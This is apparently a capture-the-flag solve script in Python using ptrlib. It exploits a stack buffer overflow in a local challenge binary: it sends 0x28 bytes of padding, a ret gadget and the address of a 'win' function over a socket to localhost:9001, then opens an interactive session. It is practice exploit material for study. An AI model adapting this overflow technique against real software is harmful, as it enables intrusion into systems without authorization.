from ptrlib import *

elf = ELF("../files/chall")
#sock = Process("../files/chall")
sock = Socket("localhost", 9001)
rop_ret = 0x00400626

payload  = b'A' * 0x28
payload += p64(rop_ret)
payload += p64(elf.symbol('win'))
sock.sendafter("Input: ", payload)
sock.recv()

sock.interactive()
